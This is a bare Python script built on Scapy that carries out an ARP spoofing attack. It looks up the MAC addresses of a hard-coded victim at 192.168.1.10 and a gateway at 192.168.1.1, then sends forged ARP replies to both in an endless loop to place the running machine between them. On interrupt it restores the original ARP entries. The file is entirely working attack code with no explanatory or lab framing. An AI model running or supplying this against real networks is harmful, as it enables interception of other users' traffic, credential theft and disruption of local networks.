from scapy.all import *
import time
import sys

def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        verbose=False
    )
    if not ans:
        raise Exception(f"No response for IP {ip}")
    return ans[0][1].hwsrc

def spoof(t_ip, s_ip, t_mac):
    packet = ARP(
        op=2,
        pdst=t_ip,
        hwdst=t_mac,
        psrc=s_ip
    )
    send(packet, verbose=False)

def restore(t_ip, g_ip, t_mac, g_mac):
    packet = ARP(
        op=2,
        pdst=t_ip,
        hwdst=t_mac,
        psrc=g_ip,
        hwsrc=g_mac
    )
    send(packet, count=5, verbose=False)

v_ip = "192.168.1.10"
g_ip = "192.168.1.1"

try:
    v_mac = get_mac(v_ip)
    g_mac = get_mac(g_ip)
except Exception as e:
    print("Issue with the mac:", e)
    sys.exit(1)

try:
    while True:
        spoof(v_ip, g_ip, v_mac)
        spoof(g_ip, v_ip, g_mac)
        time.sleep(3)
except KeyboardInterrupt:
    print("\nRestoring...")
    restore(v_ip, g_ip, v_mac, g_mac)
    restore(g_ip, v_ip, g_mac, v_mac)
    print("Done.")
    sys.exit(0)
